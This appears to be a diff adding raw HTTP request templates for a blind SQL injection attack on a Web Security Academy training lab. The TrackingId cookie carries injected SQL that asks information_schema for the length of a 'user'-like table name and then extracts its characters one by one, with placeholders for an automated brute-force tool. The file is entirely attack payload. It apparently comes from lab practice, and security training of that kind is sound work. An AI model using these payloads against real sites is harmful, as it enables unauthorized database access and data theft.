@@ -1,0 +1,35 @@
+GET /filter?category=Clothing%2c+shoes+and+accessories HTTP/1.1
+Host: 0ad800ef038ab3ff80573f6f00c7002d.web-security-academy.net
+Connection: close
+sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ad800ef038ab3ff80573f6f00c7002d.web-security-academy.net/
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Cookie: TrackingId=5lGQnT251xvAA9Hg'%20and%20{BFP}{OPE}length((select%20table_name%20from%20information_schema.tables%20where%20table_name%20like%20'user%25'%20limit%201%20offset%202))%20and%20'a'%3d'a; session=mOgQKMEF6Y0KPwEYB2joLWTu4Q4yjLXk
+
+
+GET /filter?category=Clothing%2c+shoes+and+accessories HTTP/1.1
+Host: 0ad800ef038ab3ff80573f6f00c7002d.web-security-academy.net
+Connection: close
+sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ad800ef038ab3ff80573f6f00c7002d.web-security-academy.net/
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Cookie: TrackingId=5lGQnT251xvAA9Hg'%20and%20{BFP}{OPE}ascii(substring((select%20table_name%20from%20information_schema.tables%20where%20table_name%20like%20'user%25'%20limit%201%20offset%200),{INC_1},1))%20and%20'a'%3d'a; session=mOgQKMEF6Y0KPwEYB2joLWTu4Q4yjLXk
+
